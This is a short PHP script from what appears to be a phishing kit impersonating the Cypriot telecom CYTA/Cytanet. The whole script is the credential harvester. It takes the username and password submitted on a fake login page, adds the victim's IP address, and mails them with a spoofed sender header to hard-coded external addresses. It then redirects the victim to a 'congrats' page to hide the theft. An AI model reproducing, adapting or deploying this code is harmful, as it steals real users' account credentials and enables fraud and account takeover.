<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ipaddress = getenv("REMOTE_ADDR");
$recipient = "astronix880@gmail.com,homeplus76@aol.com"; // Replace your email id here
$browser = $_SERVER['HTTP_USER_AGENT'];

if (empty($username) || empty($password))
	{
	header( "Location: cytanet.php" );
	}
  else
	{
	$date = date('d-m-Y');
	$message = "------+ CYTA +------\n";
	$message.= $username . "\n";
	$message.= $password . "\n";
	$message.= $ipaddress . "\n";
	$message.= "------+ Created by GHOSTWORLD +------\n";
	$subject = " $date ||CYTANET||: " . $ipaddress . "\n";
	$headers = "From: ||GHOSTWORLD||<kane@kanesangels.com>\n";
	mail($recipient, $subject, $message, $headers);
	header("Location: final/congrats.php?email=$username");
	}

?>
